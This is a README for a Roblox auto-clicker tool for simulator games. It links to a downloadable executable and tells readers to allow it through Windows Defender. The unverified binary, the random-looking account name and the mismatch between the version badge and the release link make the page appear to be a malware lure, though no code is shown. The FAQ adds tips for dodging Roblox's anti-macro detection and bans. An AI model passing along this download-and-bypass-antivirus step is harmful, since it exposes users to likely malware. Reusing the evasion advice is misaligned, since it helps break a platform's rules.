# Roblox Auto Clicker

![banner](https://raw.githubusercontent.com/0634891398a-gif/roblox-simulator-clicker/main/assets/banner.png)

![Version](https://img.shields.io/badge/version-2.4.1-blue) ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green)

**About**

I built this after too many nights grinding simulator games where my hand would cramp from holding left-click for hours just to hit the next rebirth or open another egg batch. Most auto-clickers either get detected fast or can't keep up with the way Roblox simulators spawn new click zones and pet multipliers every update. This tool started as a simple script for my own alt accounts and slowly turned into something I could run across a few windows without constant babysitting.

**Features**

- Handles multiple Roblox instances so you can run separate simulator accounts without focus switching
- Click timing that matches common rebirth thresholds and coin cap resets in most clicker-games
- Built-in detection for egg hatch prompts and auto-continues without breaking the current streak
- Zone-aware clicking that follows the camera when you move between areas like the latest event map
- Simple profile saving for different games so you don't reset CPS every time you hop into a new simulator
- Lightweight enough to stay under Roblox's usual input thresholds during longer sessions

**Requirements**

- Windows 10 or 11
- 4 GB RAM
- .NET 6.0 Desktop Runtime

**Installation**

1. Download the latest release from [GitHub Releases](https://github.com/0634891398a-gif/roblox-simulator-clicker/releases/download/v1.0/RobloxSimulatorClicker-v1.0.zip)
2. Extract the zip to a folder outside Program Files
3. Run RobloxSimulatorClicker.exe and allow it through Windows Defender if prompted
4. Launch Roblox in windowed mode and select your target window from the dropdown

**Screenshots**

| Main Interface | Setup Wizard |
|----------------|--------------|
| ![main](https://raw.githubusercontent.com/0634891398a-gif/roblox-simulator-clicker/main/assets/screenshot_main.png) | ![installer](https://raw.githubusercontent.com/0634891398a-gif/roblox-simulator-clicker/main/assets/screenshot_installer.png) |
![app running](https://raw.githubusercontent.com/0634891398a-gif/roblox-simulator-clicker/main/assets/screenshot_app.png)

**FAQ**

**Does this work with Pet Simulator 99?**  
It does for basic clicking and egg loops. The newer anti-macro checks can still flag it if you run 24/7 on the same account, so most people rotate alts.

**Will Roblox ban me for using an auto-clicker?**  
They can. I've kept accounts going for weeks by staying under 15 CPS and adding random delays, but nothing is guaranteed.

**How do I stop it from clicking during cutscenes or trades?**  
There's a pause hotkey (default F8) and a black-list for certain UI elements. Add the trade window title and it skips those moments automatically.

**Disclaimer**

This is a hobby project made for personal use. Roblox can detect third-party input tools and issue bans. Use at your own risk.